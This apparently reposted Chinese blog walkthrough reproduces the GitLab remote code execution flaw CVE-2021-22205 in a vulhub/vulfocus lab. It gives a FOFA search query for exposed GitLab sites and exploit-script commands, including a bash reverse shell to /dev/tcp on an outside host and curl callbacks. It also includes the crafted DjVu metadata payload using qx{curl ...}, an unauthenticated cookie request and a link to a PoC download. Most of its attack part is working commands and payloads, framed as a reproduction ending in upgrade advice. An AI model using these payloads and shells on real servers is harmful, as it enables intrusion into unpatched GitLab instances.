> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4QT-vxKpBn4ppNM9ipt-nQ)

一、漏洞描述
------

GitLab 没有正确验证传递给文件解析器的图像文件，这导致远程命令执行，可执行系统命令。这是一个严重的问题。它现在在最新版本中得到缓解，漏洞编号 CVE-2021-22205。

二、影响范围
------

以下版本范围内的 GitLab（CE/EE）受到漏洞影响：

```
11.9 <=  GitLab（CE/EE）< 13.8.8
13.9 <=  GitLab（CE/EE）< 13.9.6
13.10 <= GitLab（CE/EE）< 13.10.3
```

三、fofa 搜索
---------

自己人不打自己人

```
title="GitLab"
```

页面长这样

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgURKybVPVTclwouia8DXCBxAgCd3HoO0Zfujfsyw3VbxHOheJ0R8pWqA/640?wx_fmt=png)image-20211102092216930

四、环境搭建
------

```
git clone https://github.com/vulhub/vulhub.gitcd vulhub/gitlab/CVE-2021-22205/docker-compose up -d
```

docker 配置中设置的端口映射到本地的 8080 端口，bp 开着的记得换一下端口

环境启动后，访问 http://127.0.0.1:8080 即可查看到 GitLab 的登录页面

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgdJfonEB3OYMWVia6IG9cJ5wFicXE6cIjtagvmsOibaTrib516PoAvuGymQ/640?wx_fmt=png)image-20211102154432735

五、脚本复现
------

### 1 下载工具

```
https://github.com/Al1ex/CVE-2021-22205
```

git 到本地，由于执行命令无回显，可以使用 dnslog 外带回显结果

```
http://dnslog.cn/
```

获取一个 dnslog 的 url，替换到脚本里面

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicga6GzYHXzhg2ENS4KyQOiblCXVBKs2dFnsrrzME6xrr6YCibssz3pusdw/640?wx_fmt=png)image-20211102161540518![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicg8tW2bpV4xuZicbLydwVIL6g5m3dOa7dJ8dZGDG8yv8GomibsP3MQSwKA/640?wx_fmt=png)image-20211102161638995

开始唆

### 2 检测漏洞是否存在

```
python3 CVE-2021-22205.py -v true -t http://10.0.1.12:8080/
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgUMroWVkvqgqNhvFUJJ0BhiaK0oCkORjqyxVbpsZHrH2bmUhHsvePz7A/640?wx_fmt=png)image-20211102161900299

### 3 命令执行

试一下先，不知道为什么我这里没有 dnslog 回显

```
python3 CVE-2021-22205.py -a true -t http://10.0.1.12:8080/ -c "curl http://4.xx.xx.6/1.txt"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicggyhibp8xnw8M0l19oStcCQFM3yINhSnruQntthsfD78jCNBgian6tgfQ/640?wx_fmt=png)image-20211102162200134

但是服务器可以看出已经成功执行

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgwKqvM5IPvjvpDdyZs9tzM1jczcPKckoLuqOpJowzY1nCqBdPicVBxmA/640?wx_fmt=png)image-20211102162243798

### 4 反弹 shell

```
# 写入反弹shell脚本python3 CVE-2021-22205.py -a true -t http://10.0.1.12:8080/ -c "echo 'bash -i >& /dev/tcp/4.xx.xx.6/6666 0>&1' > /tmp/1.sh"# 给执行权限python3 CVE-2021-22205.py -a true -t http://10.0.1.12:8080/ -c "chmod +x /tmp/1.sh"# 服务器监听6666端口nc -lvnp 6666# 运行,获取git权限shellpython3 CVE-2021-22205.py -a true -t http://10.0.1.12:8080/ -c "/bin/bash /tmp/1.sh"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgcmIUibShMpluick7b123ibvoVib3yonxuGIaSbDXpLmQ3vaVBvo25O4RGA/640?wx_fmt=png)image-20211102162743402![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgw5XwhFS9iaCA3fphlCdtpTLKarCsQ0raLvKGKhG3j2eAwic80ry8hPfA/640?wx_fmt=png)image-20211102213550299

六、手工复现 - 有授权
------------

### 1 上传点

vulhub 截止到今天 2021.11.2，我今天拉的 docker，gitlab 环境有点问题，注册账号需要管理员审核，但找不到管理员账号密码。。。

换 vulfocus 靶场，搭建之后访问，会跳转到设置密码的页面，设置 root 新密码就可以登录啦，页面长这样

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgYBDhoC0dB9yWOrClEnEAvIAvyQ5icyluT3cbGeg2rkATF1ngicPxiauAQ/640?wx_fmt=png)image-20211102172744884

搞个普通用户复现漏洞，注册 ch4nge 用户

登录后到个人主页，找到`Snippets`, 新建

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgLXSXf5fpia0KLZ7agTAIWtue3CfxXMiclicbGia6TfljiaoAxicKUicZa6P1g/640?wx_fmt=png)image-20211102201740899

此处需要上传`DjVu`格式图片（即 Exp）

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgpkNvVGPicg9iayMUkv5e6vDxybX4fK6YZs16SKe1jGRy087yAsjHiaIDw/640?wx_fmt=png)image-20211102201936387

### 2 DjVu 格式图片制作方式

下载安装 DjVuLibre 地址

```
http://djvu.sourceforge.net/
```

准备好将要压缩图片的文本

```
(metadata (Copyright "\" . qx{curl cc.n443pb.dnslog.cn} . \" b ") )
```

生成 Exp

```
djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgFNOnHqbkkbOXLfBPxLvxmUwzQmH65Vd7Xb74umxMVIFdTr5LjvFAaA/640?wx_fmt=png)image-20211102203205714

### 3 上传 Exp

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgjd8XYq2Re0CqRy6EKoll1eEic8yUMc7mcbNsecCXAVhxd9foThr97TQ/640?wx_fmt=png)image-20211102203859540

虽然报错，但是已经执行了命令

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgb9AdzgGS1PKAfb1ibRKWtAmb0Y9AIJBccL8bOhOfialLGPMVtIMK3uNw/640?wx_fmt=png)image-20211102203927038

将恶意代码修改为远程访问文件试一下

```
(metadata (Copyright "\" . qx{curl http://4.xx.xx.6/1.txt} . \" b ") )
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgVJLO7yEsfm9GpPust9OTJdb3WQ8lt4XboSfEGzIR4lzA8TY3gMUZTw/640?wx_fmt=png)image-20211102205014094

### 4 命令执行

成功执行，之后没必要一次次生成文件了，上传文件的时候使用 burpsuite 抓包，直接在包里改命令就好

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgqlKK5CnEausPmFDyk9Txo5w6Pt3FHHqkl5jia9LEayNPUm2W5XVBNAg/640?wx_fmt=png)image-20211102211355774![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicg9ytX92IDGeYWXqibMCkOLbukD5nW4mI6Xzl3t98PxnK3rSFQhibIibQYQ/640?wx_fmt=png)image-20211102213342552

七、手工复现 - 未授权
------------

有些 gitlab 是没法直接注册用户使用的，这就用到未授权获取 cookie。POC 都是我登录账号之后抓的

### 1 获取 cookie

使用登录页面返回的 Cookie 值和 csrf-token 值

POC

```
GET /users/sign_in HTTP/1.1
Host: 10.11.1.120:8020
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgp6Lazecu66ticPibsYibpj8oMfPhh9Ebnsgq2SMDqoH2o4z1ml6BVwxvA/640?wx_fmt=png)image-20211102211623804![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgHT3ibFE7mER8hIkEL80y71lpA8ED7htNe42JEsPzOia6q9LjkB777pLw/640?wx_fmt=png)image-20211102211645904

### 2 RCE

使用登录页面返回的 Cookie 值和 csrf-token 值，成功实现 RCE。

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicglxRayaDibj4rqXx7IUX5pSd5iaGciaT558ic0YovGQWCUjMMMuRqjibnL6Q/640?wx_fmt=png)image-20211102211913301![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgoIxcibbDg1PpG0XDoQ6mOZFR8iarIGVrWH46hxmCKlMRvjojpDpicvJvQ/640?wx_fmt=png)image-20211102213447050

### 3 POC 下载

文件下载

https://change.lanzouw.com/iJySRw2kr8j 密码: love

下载后导入 bp 的重放器，改 host 就行

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgpMIC8t0XmT61K59U1vw7QY1BDXDBgysicJHJRlmYpicUib9X4O6TSghYw/640?wx_fmt=png)image-20211102212604909![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgOeKEenmm2l5pwWPq6IDZpcy0p8KH9gMPSvSxAuET9xnWwaAmduNajw/640?wx_fmt=png)image-20211102212619680![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpYEKjYfedwtiaWhX3fPicVicgbe3yjkvE7tccWe4x3hEJ499bZTFXXWKicVuSXJYD21AwLrtq05Fz2Vg/640?wx_fmt=png)image-20211102212640984

八、解决方案
------

升级到最新版本。

要更新 GitLab，请参阅更新页面。要更新 Gitlab Runner，请参阅更新 Runner 页面。

九、参考
----

https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/

https://github.com/Al1ex/CVE-2021-22205

https://blog.csdn.net/smellycat000/article/details/121005824

https://www.wangan.com/p/7fygfydb5d6d0c1e